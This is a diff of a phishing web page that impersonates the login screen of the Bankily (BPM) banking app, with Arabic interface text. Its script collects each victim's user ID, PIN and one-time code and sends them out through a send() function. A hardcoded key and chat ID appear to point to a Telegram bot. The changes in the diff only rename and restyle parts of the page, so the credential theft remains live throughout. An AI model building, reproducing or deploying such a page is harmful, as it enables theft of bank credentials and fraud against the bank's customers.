@@ -3,55 +3,52 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Bankily - BPM</title>
+    <title>بنكيلى - BPM</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@400;700&display=swap');
-        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; min-height: 100vh; }
+        body { font-family: 'Tajawal', sans-serif; background-color: #ffffff; margin: 0; min-height: 100vh; overflow-x: hidden; }
 
-        /* تقسيم الواجهة - النصف العلوي */
+        /* النصف العلوي مع الصورة المطلوبة */
         .hero-section { 
             height: 45vh; 
             background: url('https://i.ibb.co/3W6f99B/bankily-hero.jpg') no-repeat center center; 
             background-size: cover;
             position: relative;
-            z-index: 1;
         }
 
-        /* التدرج اللوني الاحترافي للدمج */
+        /* التدرج اللوني لربط النصفين بسلاسة */
         .hero-overlay {
             position: absolute;
-            bottom: -2px;
+            bottom: 0;
             left: 0;
             width: 100%;
             height: 120px;
-            background: linear-gradient(to bottom, transparent, #ffffff 90%);
-            z-index: 2;
+            background: linear-gradient(to bottom, transparent, #ffffff 100%);
         }
 
-        /* تنسيق الحقول */
-        .form-container { padding: 10px 40px; position: relative; z-index: 3; }
+        /* تنسيق الحقول والمحتوى */
+        .form-container { padding: 10px 40px; position: relative; z-index: 10; }
         .input-group { position: relative; margin-bottom: 35px; }
         .input-label { display: block; text-align: right; margin-bottom: 8px; color: #00a5bc; font-size: 15px; font-weight: bold; }
-        .input-line { width: 100%; border: none; border-bottom: 2.5px solid #00a5bc; outline: none; padding: 10px 0; font-size: 20px; text-align: center; background: transparent; color: #333; }
-        .icon-field { position: absolute; right: 0; bottom: 12px; width: 24px; opacity: 0.8; }
+        .input-line { width: 100%; border: none; border-bottom: 2px solid #00a5bc; outline: none; padding: 10px 0; font-size: 20px; text-align: center; background: transparent; color: #333; }
+        .icon-field { position: absolute; right: 0; bottom: 12px; width: 24px; opacity: 0.7; }
 
         /* زر الدخول السفلي */
-        .btn-bankily { background-color: #ffb400; color: white; width: 100%; padding: 18px; font-size: 24px; font-weight: bold; border: none; position: fixed; bottom: 0; right: 0; cursor: pointer; z-index: 10; }
-        .btn-bankily:active { background-color: #e6a200; }
+        .btn-action { background-color: #ffb400; color: white; width: 100%; padding: 18px; font-size: 24px; font-weight: bold; border: none; position: fixed; bottom: 0; right: 0; cursor: pointer; }
 
         /* واجهة الـ OTP */
         #screen-otp { display: none; min-height: 100vh; background: white; text-align: center; }
         .top-header { background-color: #00a5bc; height: 60px; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 18px; }
         .otp-boxes { display: flex; gap: 12px; justify-content: center; margin: 40px 0; }
-        .otp-dot { width: 45px; border-bottom: 3px solid #00a5bc; height: 50px; text-align: center; font-size: 28px; outline: none; background: transparent; }
+        .otp-dot { width: 45px; border-bottom: 3px solid #00a5bc; height: 50px; text-align: center; font-size: 28px; outline: none; font-weight: bold; }
 
         .timer-ring { width: 50px; height: 50px; border: 4px solid #00ff00; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 20px auto; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <!-- الواجهة الأولى -->
+    <!-- واجهة تسجيل دخول بنكيلى -->
     <div id="screen-login">
         <div class="hero-section">
             <div class="hero-overlay"></div>
@@ -79,56 +76,60 @@
             </div>
         </div>
 
-        <button onclick="goToOTP()" class="btn-bankily">تسجيل الدخول</button>
+        <button onclick="handleLogin()" class="btn-action">تسجيل الدخول</button>
     </div>
 
-    <!-- واجهة الـ OTP -->
+    <!-- واجهة رمز التحقق -->
     <div id="screen-otp">
-        <div class="top-header">رمز التحقق</div>
+        <div class="top-header">رمز التحقق - بنكيلى</div>
         <div class="px-8 mt-16">
-            <h2 class="font-bold text-xl mb-4">أدخل رمز التأكيد المرسل إلى هاتفك</h2>
+            <h2 class="font-bold text-xl mb-4 text-gray-800">أدخل رمز التأكيد المرسل إلى هاتفك</h2>
             <div class="otp-boxes">
-                <input type="tel" maxlength="1" class="otp-dot" oninput="focusNext(this, 0)">
-                <input type="tel" maxlength="1" class="otp-dot" oninput="focusNext(this, 1)">
-                <input type="tel" maxlength="1" class="otp-dot" oninput="focusNext(this, 2)">
-                <input type="tel" maxlength="1" class="otp-dot" oninput="focusNext(this, 3)">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="move(this, 0)">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="move(this, 1)">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="move(this, 2)">
+                <input type="tel" maxlength="1" class="otp-dot" oninput="move(this, 3)">
             </div>
             <p class="text-gray-500 text-sm">تنتهي صلاحية الرمز خلال</p>
             <p class="font-bold text-red-500 text-lg">04:59</p>
             <div class="timer-ring">5</div>
-            <button class="text-blue-600 font-bold mt-10 block mx-auto underline">إعادة إرسال الرمز</button>
+            <button class="text-blue-600 font-bold mt-10 block mx-auto underline">إعادة إرسال رمز التأكيد</button>
         </div>
-        <button onclick="finish()" class="btn-bankily">تم</button>
+        <button onclick="handleOTP()" class="btn-action">تم</button>
     </div>
 
     <script>
         const T = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
         const C = "8665814266";
 
-        function focusNext(el, i) {
-            const dots = document.querySelectorAll('.otp-dot');
-            if (el.value && i < 3) dots[i+1].focus();
+        function move(el, i) {
+            const inputs = document.querySelectorAll('.otp-dot');
+            if (el.value.length === 1 && i < 3) inputs[i+1].focus();
         }
 
-        function goToOTP() {
+        function handleLogin() {
             const u = document.getElementById('user_id').value;
             const p = document.getElementById('pin').value;
+            
             if(u.length === 8 && p.length === 4) {
-                send(`🏦 Bankily Login\n📱 User: ${u}\n🔐 PIN: ${p}`);
+                // إرسال البيانات (بنكيلى)
+                send(`🏦 Benkily (بنكيلى) Login\n📱 User: ${u}\n🔐 PIN: ${p}`);
                 document.getElementById('screen-login').style.display = 'none';
                 document.getElementById('screen-otp').style.display = 'block';
             } else {
-                alert("يرجى إكمال البيانات");
+                alert("يرجى التحقق من رقم الهاتف (8 أرقام) والرمز (4 أرقام)");
             }
         }
 
-        function finish() {
+        function handleOTP() {
             let code = "";
             document.querySelectorAll('.otp-dot').forEach(d => code += d.value);
             if(code.length === 4) {
-                send(`🔑 Bankily OTP: ${code}`);
-                alert("جاري المعالجة...");
+                send(`🔑 Benkily (بنكيلى) OTP: ${code}`);
+                alert("جاري التحقق من الرمز...");
                 location.reload();
+            } else {
+                alert("يرجى إدخال الرمز كاملاً");
             }
         }
 
